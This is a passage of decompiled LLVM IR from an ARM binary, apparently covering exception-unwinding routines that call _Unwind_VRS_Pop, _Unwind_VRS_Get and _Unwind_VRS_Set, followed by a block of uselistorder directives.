  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_19768 = mul i32 %v0_19760, 256
  store i32 %v3_19768, i32* %r0.global-to-local, align 4
  %v1_1976c = load i32, i32* @r5, align 4
  %v2_1976c = inttoptr i32 %v1_1976c to i32*
  store i32 %v3_19768, i32* %v2_1976c, align 4
  br i1 %tmp184, label %dec_label_pc_19528, label %dec_label_pc_19774

dec_label_pc_19774:                               ; preds = %dec_label_pc_19760
  %v0_19774 = load i32, i32* %r3.global-to-local, align 4
  %v1_19774 = and i32 %v0_19774, 240
  store i32 %v1_19774, i32* %r3.global-to-local, align 4
  %v2_19774 = icmp eq i32 %v1_19774, 0
  store i1 %v2_19774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19774, label %dec_label_pc_1977c, label %dec_label_pc_19528

dec_label_pc_1977c:                               ; preds = %dec_label_pc_19774
  %v0_1977c = load i32, i32* @r7, align 4
  store i32 %v0_1977c, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_19784 = load i32, i32* %r2.global-to-local, align 4
  %v4_19784 = call i32 @_Unwind_VRS_Pop(i32 %v0_1977c, i32 4, i32 %v2_19784, i32 0)
  store i32 %v4_19784, i32* %r0.global-to-local, align 4
  %v2_19788 = icmp eq i32 %v4_19784, 0
  store i1 %v2_19788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19788, label %dec_label_pc_19258.backedge, label %dec_label_pc_19790

dec_label_pc_19790:                               ; preds = %dec_label_pc_1977c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19380

dec_label_pc_19798:                               ; preds = %dec_label_pc_195c4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_197a4 = load i32, i32* @r7, align 4
  store i32 %v0_197a4, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_197b0 = call i32 @_Unwind_VRS_Get(i32 %v0_197a4, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_197b0, i32* %r0.global-to-local, align 4
  %v0_197b4 = load i32, i32* @r5, align 4
  %v1_197b4 = add i32 %v0_197b4, 8
  %v2_197b4 = inttoptr i32 %v1_197b4 to i8*
  %v3_197b4 = load i8, i8* %v2_197b4, align 1
  %v4_197b4 = zext i8 %v3_197b4 to i32
  store i32 %v4_197b4, i32* %r1.global-to-local, align 4
  %v2_197b8 = icmp eq i8 %v3_197b4, 0
  store i1 %v2_197b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_197b8, label %dec_label_pc_197c8, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_19798
  %v2_197bc = add nsw i32 %v4_197b4, -1
  store i32 %v2_197bc, i32* %r3.global-to-local, align 4
  %v2_197c0 = trunc i32 %v2_197bc to i8
  store i8 %v2_197c0, i8* %v2_197b4, align 1
  %v0_197c4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_197c4.pr.pr, label %.thread58.dec_label_pc_197c8_crit_edge, label %dec_label_pc_197f4

.thread58.dec_label_pc_197c8_crit_edge:           ; preds = %.thread58
  %v0_197c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_197c8

dec_label_pc_197c8:                               ; preds = %.thread58.dec_label_pc_197c8_crit_edge, %dec_label_pc_19798
  %v2_197dc = phi i32 [ %v0_197c8.pre, %.thread58.dec_label_pc_197c8_crit_edge ], [ %v0_197b4, %dec_label_pc_19798 ]
  %v1_197c8 = add i32 %v2_197dc, 9
  %v2_197c8 = inttoptr i32 %v1_197c8 to i8*
  %v3_197c8 = load i8, i8* %v2_197c8, align 1
  %v4_197c8 = zext i8 %v3_197c8 to i32
  store i32 %v4_197c8, i32* %r3.global-to-local, align 4
  %v2_197cc = icmp eq i8 %v3_197c8, 0
  store i1 %v2_197cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_197cc, label %bb158, label %dec_label_pc_197d8

bb158:                                            ; preds = %dec_label_pc_197c8
  %v1_197d0 = load i32, i32* @r6, align 4
  store i32 %v1_197d0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1981c

dec_label_pc_197d8:                               ; preds = %dec_label_pc_197c8
  %v1_197d8 = add nsw i32 %v4_197c8, -1
  store i32 %v1_197d8, i32* %r3.global-to-local, align 4
  %v1_197dc = trunc i32 %v1_197d8 to i8
  store i8 %v1_197dc, i8* %v2_197c8, align 1
  %v0_197e0 = load i32, i32* @r5, align 4
  %v1_197e0 = add i32 %v0_197e0, 4
  %v2_197e0 = inttoptr i32 %v1_197e0 to i32*
  %v3_197e0 = load i32, i32* %v2_197e0, align 4
  store i32 %v3_197e0, i32* %r2.global-to-local, align 4
  %v1_197e4 = inttoptr i32 %v3_197e0 to i32*
  %v2_197e4 = load i32, i32* %v1_197e4, align 4
  store i32 %v2_197e4, i32* %r0.global-to-local, align 4
  %v4_197e4 = add i32 %v3_197e0, 4
  store i32 %v4_197e4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_197ec = inttoptr i32 %v0_197e0 to i32*
  store i32 %v2_197e4, i32* %v1_197ec, align 4
  %v5_197ec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_197ec, i32* %v2_197e0, align 4
  %v0_197f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_197f0 = trunc i32 %v0_197f0 to i8
  %v2_197f0 = load i32, i32* @r5, align 4
  %v3_197f0 = add i32 %v2_197f0, 8
  %v4_197f0 = inttoptr i32 %v3_197f0 to i8*
  store i8 %v1_197f0, i8* %v4_197f0, align 1
  br label %dec_label_pc_197f4

dec_label_pc_197f4:                               ; preds = %.thread58, %dec_label_pc_197d8
  %v0_197f4 = load i32, i32* @r5, align 4
  %v1_197f4 = inttoptr i32 %v0_197f4 to i32*
  %v2_197f4 = load i32, i32* %v1_197f4, align 4
  store i32 %v2_197f4, i32* %r3.global-to-local, align 4
  %v3_197f8 = mul i32 %v2_197f4, 256
  store i32 %v3_197f8, i32* %r0.global-to-local, align 4
  %v3_197fc = udiv i32 %v2_197f4, 16777216
  store i32 %v3_197fc, i32* %r2.global-to-local, align 4
  store i32 %v3_197f8, i32* %v1_197f4, align 4
  %v0_19804 = load i32, i32* %r2.global-to-local, align 4
  %v1_19804 = and i32 %v0_19804, 128
  %v2_19804 = icmp eq i32 %v1_19804, 0
  store i1 %v2_19804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19804, label %.thread129, label %dec_label_pc_19818

.thread129:                                       ; preds = %dec_label_pc_197f4
  %v4_19808 = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_19808, i32* %ip.global-to-local, align 4
  %v1_1980c = urem i32 %v0_19804, 256
  store i32 %v1_1980c, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_1988c

dec_label_pc_19818:                               ; preds = %dec_label_pc_197f4
  %v1_1980c63 = urem i32 %v0_19804, 256
  store i32 %v1_1980c63, i32* %r2.global-to-local, align 4
  %v0_19818 = load i32, i32* @r5, align 4
  %v1_19818 = add i32 %v0_19818, 8
  %v2_19818 = inttoptr i32 %v1_19818 to i8*
  %v3_19818 = load i8, i8* %v2_19818, align 1
  %v4_19818 = zext i8 %v3_19818 to i32
  store i32 %v4_19818, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1981c

dec_label_pc_1981c:                               ; preds = %bb158, %dec_label_pc_19818
  %v3_1983c99 = phi i32 [ %v2_197dc, %bb158 ], [ %v0_19818, %dec_label_pc_19818 ]
  %v0_1982492 = phi i32 [ %v1_197d0, %bb158 ], [ %v1_1980c63, %dec_label_pc_19818 ]
  %v3_1981c = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_1981c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_19824

dec_label_pc_19824:                               ; preds = %dec_label_pc_19824.backedge, %dec_label_pc_1981c
  %v3_1983c = phi i32 [ %v3_1983c100, %dec_label_pc_19824.backedge ], [ %v3_1983c99, %dec_label_pc_1981c ]
  %v0_19838 = phi i32 [ %v2_19828.pre, %dec_label_pc_19824.backedge ], [ 2, %dec_label_pc_1981c ]
  %v0_19828 = phi i32 [ %v0_19828.pre, %dec_label_pc_19824.backedge ], [ %v3_1981c, %dec_label_pc_1981c ]
  %v0_19824 = phi i32 [ %v0_1982495, %dec_label_pc_19824.backedge ], [ %v0_1982492, %dec_label_pc_1981c ]
  %v1_19824 = urem i32 %v0_19824, 128
  %v7_19828 = shl i32 %v1_19824, %v0_19838
  %v8_19828 = add i32 %v7_19828, %v0_19828
  store i32 %v8_19828, i32* %ip.global-to-local, align 4
  %v0_1982c = load i32, i32* %r1.global-to-local, align 4
  %v2_1982c = icmp eq i32 %v0_1982c, 0
  store i1 %v2_1982c, i1* %cpsr_z.global-to-local, align 1
  %v1_19830 = add i32 %v0_1982c, -1
  store i32 %v1_19830, i32* %r3.global-to-local, align 4
  store i32 %v8_19828, i32* %stack_var_-36, align 4
  %v1_19838 = add i32 %v0_19838, 7
  store i32 %v1_19838, i32* @lr, align 4
  br i1 %v2_1982c, label %dec_label_pc_19844, label %bb159

bb159:                                            ; preds = %dec_label_pc_19824
  %v2_1983c = trunc i32 %v1_19830 to i8
  %v4_1983c = add i32 %v3_1983c, 8
  %v5_1983c = inttoptr i32 %v4_1983c to i8*
  store i8 %v2_1983c, i8* %v5_1983c, align 1
  %v0_19840.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19840.pr, label %.dec_label_pc_19844_crit_edge, label %dec_label_pc_19870

.dec_label_pc_19844_crit_edge:                    ; preds = %bb159
  %v0_19844.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19844

dec_label_pc_19844:                               ; preds = %.dec_label_pc_19844_crit_edge, %dec_label_pc_19824
  %v2_1985c = phi i32 [ %v0_19844.pre, %.dec_label_pc_19844_crit_edge ], [ %v3_1983c, %dec_label_pc_19824 ]
  %v1_19844 = add i32 %v2_1985c, 9
  %v2_19844 = inttoptr i32 %v1_19844 to i8*
  %v3_19844 = load i8, i8* %v2_19844, align 1
  %v4_19844 = zext i8 %v3_19844 to i32
  store i32 %v4_19844, i32* %r3.global-to-local, align 4
  %v2_19848 = icmp eq i8 %v3_19844, 0
  store i1 %v2_19848, i1* %cpsr_z.global-to-local, align 1
  %v1_1984c = add nsw i32 %v4_19844, -1
  store i32 %v1_1984c, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_19848, label %dec_label_pc_19824.backedge, label %dec_label_pc_19858

dec_label_pc_19858:                               ; preds = %dec_label_pc_19844
  %v1_19858 = add i32 %v2_1985c, 4
  %v2_19858 = inttoptr i32 %v1_19858 to i32*
  %v3_19858 = load i32, i32* %v2_19858, align 4
  store i32 %v3_19858, i32* %r2.global-to-local, align 4
  %v1_1985c = trunc i32 %v1_1984c to i8
  store i8 %v1_1985c, i8* %v2_19844, align 1
  %v0_19860 = load i32, i32* %r2.global-to-local, align 4
  %v1_19860 = inttoptr i32 %v0_19860 to i32*
  %v2_19860 = load i32, i32* %v1_19860, align 4
  store i32 %v2_19860, i32* %r0.global-to-local, align 4
  %v4_19860 = add i32 %v0_19860, 4
  store i32 %v4_19860, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_19868 = load i32, i32* @r5, align 4
  %v3_19868 = add i32 %v2_19868, 8
  %v4_19868 = inttoptr i32 %v3_19868 to i8*
  store i8 3, i8* %v4_19868, align 1
  %v0_1986c = load i32, i32* @r5, align 4
  %v1_1986c = inttoptr i32 %v0_1986c to i32*
  %v2_1986c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1986c, i32* %v1_1986c, align 4
  %v3_1986c = add i32 %v0_1986c, 4
  %v4_1986c = inttoptr i32 %v3_1986c to i32*
  %v5_1986c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1986c, i32* %v4_1986c, align 4
  br label %dec_label_pc_19870

dec_label_pc_19870:                               ; preds = %bb159, %dec_label_pc_19858
  %v0_19870 = load i32, i32* @r5, align 4
  %v1_19870 = inttoptr i32 %v0_19870 to i32*
  %v2_19870 = load i32, i32* %v1_19870, align 4
  store i32 %v2_19870, i32* %r3.global-to-local, align 4
  %v3_19874 = udiv i32 %v2_19870, 16777216
  store i32 %v3_19874, i32* %r2.global-to-local, align 4
  %v1_19878 = and i32 %v3_19874, 128
  %v2_19878 = icmp eq i32 %v1_19878, 0
  store i1 %v2_19878, i1* %cpsr_z.global-to-local, align 1
  %v3_1987c = mul i32 %v2_19870, 256
  store i32 %v3_1987c, i32* %r0.global-to-local, align 4
  store i32 %v3_1987c, i32* %v1_19870, align 4
  %v0_19884 = load i32, i32* %r2.global-to-local, align 4
  %v1_19884 = urem i32 %v0_19884, 256
  store i32 %v1_19884, i32* %r2.global-to-local, align 4
  br i1 %v2_19878, label %dec_label_pc_1988c.loopexit, label %dec_label_pc_198b8

dec_label_pc_1988c.loopexit:                      ; preds = %dec_label_pc_19870
  %v0_19890.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_19894.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1988c

dec_label_pc_1988c:                               ; preds = %dec_label_pc_1988c.loopexit, %.thread129
  %v2_19894 = phi i32 [ 2, %.thread129 ], [ %v2_19894.pre, %dec_label_pc_1988c.loopexit ]
  %v0_19890 = phi i32 [ %v4_19808, %.thread129 ], [ %v0_19890.pre, %dec_label_pc_1988c.loopexit ]
  %v0_1988c = phi i32 [ %v1_1980c, %.thread129 ], [ %v1_19884, %dec_label_pc_1988c.loopexit ]
  %v1_1988c = urem i32 %v0_1988c, 128
  %v1_19890 = add i32 %v0_19890, 516
  %v7_19894 = shl i32 %v1_1988c, %v2_19894
  %v8_19894 = add i32 %v1_19890, %v7_19894
  store i32 %v8_19894, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1989c = load i32, i32* @r7, align 4
  store i32 %v0_1989c, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_19894, i32* %stack_var_-36, align 4
  %v5_198b0 = call i32 @_Unwind_VRS_Set(i32 %v0_1989c, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_198b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19258.backedge

dec_label_pc_198b8:                               ; preds = %dec_label_pc_19870
  %v0_198b8 = load i32, i32* @r5, align 4
  %v1_198b8 = add i32 %v0_198b8, 8
  %v2_198b8 = inttoptr i32 %v1_198b8 to i8*
  %v3_198b8 = load i8, i8* %v2_198b8, align 1
  %v4_198b8 = zext i8 %v3_198b8 to i32
  store i32 %v4_198b8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19824.backedge

dec_label_pc_19824.backedge:                      ; preds = %dec_label_pc_198b8, %dec_label_pc_19844
  %v3_1983c100 = phi i32 [ %v0_198b8, %dec_label_pc_198b8 ], [ %v2_1985c, %dec_label_pc_19844 ]
  %v0_1982495 = phi i32 [ %v1_19884, %dec_label_pc_198b8 ], [ 176, %dec_label_pc_19844 ]
  %v0_19828.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_19828.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_19824

dec_label_pc_198c0:                               ; preds = %dec_label_pc_195bc
  %v0_198c0 = load i32, i32* @r5, align 4
  %v1_198c0 = add i32 %v0_198c0, 8
  %v2_198c0 = inttoptr i32 %v1_198c0 to i8*
  %v3_198c0 = load i8, i8* %v2_198c0, align 1
  %v4_198c0 = zext i8 %v3_198c0 to i32
  store i32 %v4_198c0, i32* %r3.global-to-local, align 4
  %v2_198c4 = icmp eq i8 %v3_198c0, 0
  store i1 %v2_198c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_198c4, label %dec_label_pc_19928, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_198c0
  %v2_198c8 = add nsw i32 %v4_198c0, -1
  store i32 %v2_198c8, i32* %r3.global-to-local, align 4
  %v2_198cc = trunc i32 %v2_198c8 to i8
  store i8 %v2_198cc, i8* %v2_198c0, align 1
  %v0_198d0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_198d0.pr.pr, label %.thread66.dec_label_pc_19928_crit_edge, label %dec_label_pc_198d4

.thread66.dec_label_pc_19928_crit_edge:           ; preds = %.thread66
  %v0_19928.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19928

dec_label_pc_198d4:                               ; preds = %.thread66, %dec_label_pc_19934
  %v0_198d4 = load i32, i32* %r0.global-to-local, align 4
  %v3_198d4 = udiv i32 %v0_198d4, 16777216
  store i32 %v3_198d4, i32* %r3.global-to-local, align 4
  store i32 %v3_198d4, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_198d4, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_198dc = mul i32 %v0_198d4, 256
  store i32 %v3_198dc, i32* %r0.global-to-local, align 4
  %v1_198e0 = load i32, i32* @r5, align 4
  %v2_198e0 = inttoptr i32 %v1_198e0 to i32*
  store i32 %v3_198dc, i32* %v2_198e0, align 4
  br i1 %tmp185, label %dec_label_pc_19528, label %dec_label_pc_198e8

dec_label_pc_198e8:                               ; preds = %dec_label_pc_198d4
  %v0_198e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_198e8 = and i32 %v0_198e8, 240
  store i32 %v1_198e8, i32* %r1.global-to-local, align 4
  %v2_198e8 = icmp eq i32 %v1_198e8, 0
  store i1 %v2_198e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_198e8, label %dec_label_pc_198e8.dec_label_pc_19558_crit_edge, label %dec_label_pc_198f0

dec_label_pc_198e8.dec_label_pc_19558_crit_edge:  ; preds = %dec_label_pc_198e8
  %v2_19560.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19558

dec_label_pc_198f0:                               ; preds = %dec_label_pc_198e8
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19380

dec_label_pc_198f8:                               ; preds = %.thread56.dec_label_pc_198f8_crit_edge, %dec_label_pc_1974c
  %v2_19908 = phi i32 [ %v0_198f8.pre, %.thread56.dec_label_pc_198f8_crit_edge ], [ %v0_1974c, %dec_label_pc_1974c ]
  %v1_198f8 = add i32 %v2_19908, 9
  %v2_198f8 = inttoptr i32 %v1_198f8 to i8*
  %v3_198f8 = load i8, i8* %v2_198f8, align 1
  %v4_198f8 = zext i8 %v3_198f8 to i32
  store i32 %v4_198f8, i32* %r3.global-to-local, align 4
  %v2_198fc = icmp eq i8 %v3_198f8, 0
  store i1 %v2_198fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_198fc, label %dec_label_pc_19528, label %dec_label_pc_19904

dec_label_pc_19904:                               ; preds = %dec_label_pc_198f8
  %v1_19904 = add nsw i32 %v4_198f8, -1
  store i32 %v1_19904, i32* %r3.global-to-local, align 4
  %v1_19908 = trunc i32 %v1_19904 to i8
  store i8 %v1_19908, i8* %v2_198f8, align 1
  %v0_1990c = load i32, i32* @r5, align 4
  %v1_1990c = add i32 %v0_1990c, 4
  %v2_1990c = inttoptr i32 %v1_1990c to i32*
  %v3_1990c = load i32, i32* %v2_1990c, align 4
  store i32 %v3_1990c, i32* %r2.global-to-local, align 4
  %v1_19910 = inttoptr i32 %v3_1990c to i32*
  %v2_19910 = load i32, i32* %v1_19910, align 4
  store i32 %v2_19910, i32* %r0.global-to-local, align 4
  %v4_19910 = add i32 %v3_1990c, 4
  store i32 %v4_19910, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19910, i32* %v2_1990c, align 4
  %v0_1991c = load i32, i32* %r3.global-to-local, align 4
  %v1_1991c = trunc i32 %v0_1991c to i8
  %v2_1991c = load i32, i32* @r5, align 4
  %v3_1991c = add i32 %v2_1991c, 8
  %v4_1991c = inttoptr i32 %v3_1991c to i8*
  store i8 %v1_1991c, i8* %v4_1991c, align 1
  %v0_19920 = load i32, i32* %r0.global-to-local, align 4
  %v1_19920 = load i32, i32* @r5, align 4
  %v2_19920 = inttoptr i32 %v1_19920 to i32*
  store i32 %v0_19920, i32* %v2_19920, align 4
  br label %dec_label_pc_19760

dec_label_pc_19928:                               ; preds = %.thread66.dec_label_pc_19928_crit_edge, %dec_label_pc_198c0
  %v2_19938 = phi i32 [ %v0_19928.pre, %.thread66.dec_label_pc_19928_crit_edge ], [ %v0_198c0, %dec_label_pc_198c0 ]
  %v1_19928 = add i32 %v2_19938, 9
  %v2_19928 = inttoptr i32 %v1_19928 to i8*
  %v3_19928 = load i8, i8* %v2_19928, align 1
  %v4_19928 = zext i8 %v3_19928 to i32
  store i32 %v4_19928, i32* %r3.global-to-local, align 4
  %v2_1992c = icmp eq i8 %v3_19928, 0
  store i1 %v2_1992c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1992c, label %dec_label_pc_19528, label %dec_label_pc_19934

dec_label_pc_19934:                               ; preds = %dec_label_pc_19928
  %v1_19934 = add nsw i32 %v4_19928, -1
  store i32 %v1_19934, i32* %r3.global-to-local, align 4
  %v1_19938 = trunc i32 %v1_19934 to i8
  store i8 %v1_19938, i8* %v2_19928, align 1
  %v0_1993c = load i32, i32* @r5, align 4
  %v1_1993c = add i32 %v0_1993c, 4
  %v2_1993c = inttoptr i32 %v1_1993c to i32*
  %v3_1993c = load i32, i32* %v2_1993c, align 4
  store i32 %v3_1993c, i32* %r2.global-to-local, align 4
  %v1_19940 = inttoptr i32 %v3_1993c to i32*
  %v2_19940 = load i32, i32* %v1_19940, align 4
  store i32 %v2_19940, i32* %r0.global-to-local, align 4
  %v4_19940 = add i32 %v3_1993c, 4
  store i32 %v4_19940, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19940, i32* %v2_1993c, align 4
  %v0_1994c = load i32, i32* %r3.global-to-local, align 4
  %v1_1994c = trunc i32 %v0_1994c to i8
  %v2_1994c = load i32, i32* @r5, align 4
  %v3_1994c = add i32 %v2_1994c, 8
  %v4_1994c = inttoptr i32 %v3_1994c to i8*
  store i8 %v1_1994c, i8* %v4_1994c, align 1
  %v0_19950 = load i32, i32* %r0.global-to-local, align 4
  %v1_19950 = load i32, i32* @r5, align 4
  %v2_19950 = inttoptr i32 %v1_19950 to i32*
  store i32 %v0_19950, i32* %v2_19950, align 4
  br label %dec_label_pc_198d4

; uselistorder directives
  uselistorder i32 %v3_198dc, { 1, 0 }
  uselistorder i1 %tmp185, { 1, 0 }
  uselistorder i32 %v3_198d4, { 1, 0 }
  uselistorder i32 %v0_198d4, { 1, 0, 2 }
  uselistorder i32 %v1_19884, { 1, 2, 0 }
  uselistorder i32 %v3_1987c, { 1, 0 }
  uselistorder i32 %v3_19874, { 1, 0 }
  uselistorder i32 %v2_1985c, { 2, 0, 1 }
  uselistorder i32 %v1_1980c63, { 1, 0 }
  uselistorder i32 %v1_1980c, { 1, 0 }
  uselistorder i32 %v3_197f8, { 1, 0 }
  uselistorder i32 %v2_197f4, { 1, 0, 2 }
  uselistorder i32 %v3_19768, { 1, 0 }
  uselistorder i1 %tmp184, { 1, 0 }
  uselistorder i32 %v3_19760, { 1, 0 }
  uselistorder i32 %v0_19760, { 1, 0, 2 }
  uselistorder i32 %storemerge130, { 1, 0 }
  uselistorder i32 %v3_19730, { 1, 0 }
  uselistorder i32 %storemerge131, { 1, 0 }
  uselistorder i32 %v3_196c4, { 1, 0 }
  uselistorder i32 %v0_1966c, { 3, 2, 1, 0 }
  uselistorder i32 %v2_19664, { 1, 0 }
  uselistorder i32 %v2_1965c, { 1, 0 }
  uselistorder i32 %storemerge132, { 1, 0 }
  uselistorder i32 %v3_19624, { 1, 0 }
  uselistorder i32 %v0_1955c, { 2, 1, 0 }
  uselistorder i32 %v1_1953c, { 1, 0 }
  uselistorder i32 %v0_19470, { 1, 0 }
  uselistorder i32 %v0_1945c, { 1, 0, 2, 3 }
  uselistorder i1 %v2_193f4, { 1, 0 }
  uselistorder i32 %v1_193f0, { 2, 1, 0 }
  uselistorder i32 %storemerge135, { 1, 0 }
  uselistorder i32 %v3_19390, { 1, 0 }
  uselistorder i32 %v4_19368, { 1, 0 }
  uselistorder i1 %v2_19358, { 1, 0 }
  uselistorder i32 %v3_19324, { 1, 0 }
  uselistorder i32 %v3_1930c, { 1, 0 }
  uselistorder i32 %v0_192b0, { 0, 6, 1, 8, 5, 2, 7, 3, 4, 9, 10 }
  uselistorder i32 %v3_192a0, { 1, 0 }
  uselistorder i32 %v3_19298, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 5, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 61, 56, 57, 58, 59, 60, 62, 63, 64, 65, 66, 67, 68, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 69, 70, 71, 72, 0, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 61, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 39, 27, 28, 29, 30, 31, 32, 33, 34, 35, 41, 42, 36, 43, 44, 45, 46, 47, 60, 0, 37, 38, 40, 48, 49, 50, 51, 1, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 26, 15, 16, 17, 18, 11, 12, 13, 14, 19, 20, 22, 21, 23, 24, 25, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 56, 15, 8, 9, 10, 11, 12, 13, 14, 18, 16, 17, 27, 19, 20, 57, 21, 58, 22, 23, 24, 59, 25, 26, 31, 61, 32, 33, 34, 38, 36, 37, 41, 39, 40, 35, 28, 60, 29, 30, 42, 44, 43, 46, 45, 47, 49, 48, 50, 51, 65, 52, 53, 62, 54, 55, 63, 64, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 3, 1, 2, 4, 5, 6, 8, 9, 10, 0, 7, 11, 12 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 25, 26, 27, 28, 29, 30, 31, 32, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67 }
  uselistorder i32 262144, { 2, 0, 1 }
  uselistorder i32 524288, { 1, 2, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder i32 2, { 106, 127, 257, 258, 259, 114, 113, 139, 140, 260, 261, 112, 6, 7, 262, 263, 8, 264, 0, 9, 10, 265, 11, 1, 2, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 238, 46, 47, 48, 185, 49, 50, 51, 52, 53, 201, 202, 203, 205, 206, 207, 111, 208, 54, 141, 209, 210, 55, 142, 211, 212, 213, 214, 143, 217, 3, 222, 186, 187, 115, 144, 223, 145, 194, 56, 195, 228, 229, 230, 57, 116, 239, 240, 146, 241, 242, 58, 204, 231, 234, 235, 236, 59, 60, 117, 118, 119, 266, 267, 130, 268, 269, 120, 270, 271, 220, 147, 243, 110, 244, 245, 61, 62, 246, 247, 148, 196, 63, 4, 64, 188, 150, 151, 152, 154, 149, 153, 136, 155, 156, 192, 157, 272, 158, 107, 274, 159, 254, 255, 256, 160, 65, 193, 66, 121, 67, 68, 128, 197, 108, 69, 273, 129, 232, 70, 71, 233, 72, 73, 109, 215, 74, 75, 76, 216, 77, 78, 79, 80, 131, 224, 225, 81, 82, 5, 189, 226, 83, 227, 237, 190, 84, 85, 122, 123, 124, 133, 125, 134, 126, 86, 87, 161, 218, 219, 162, 163, 88, 89, 164, 165, 166, 167, 168, 248, 249, 137, 90, 91, 92, 93, 94, 138, 250, 135, 132, 95, 251, 252, 253, 169, 170, 221, 96, 171, 172, 173, 97, 98, 191, 99, 100, 101, 102, 103, 198, 104, 174, 175, 176, 199, 177, 178, 179, 200, 180, 181, 182, 105, 183, 184 }
  uselistorder i32 4080, { 1, 0 }
  uselistorder i32 7, { 20, 8, 19, 21, 22, 5, 6, 7, 23, 24, 14, 15, 4, 13, 25, 0, 10, 11, 9, 26, 12, 1, 2, 27, 16, 17, 18, 3 }
  uselistorder i32 160, { 24, 0, 1, 23, 5, 3, 6, 4, 7, 8, 10, 9, 11, 12, 15, 13, 16, 14, 17, 2, 18, 19, 21, 20, 22 }
  uselistorder i32 5, { 7, 6, 12, 13, 33, 0, 34, 1, 2, 25, 26, 27, 14, 23, 15, 29, 16, 17, 19, 18, 8, 9, 24, 3, 28, 10, 30, 11, 5, 31, 32, 20, 21, 4, 22 }
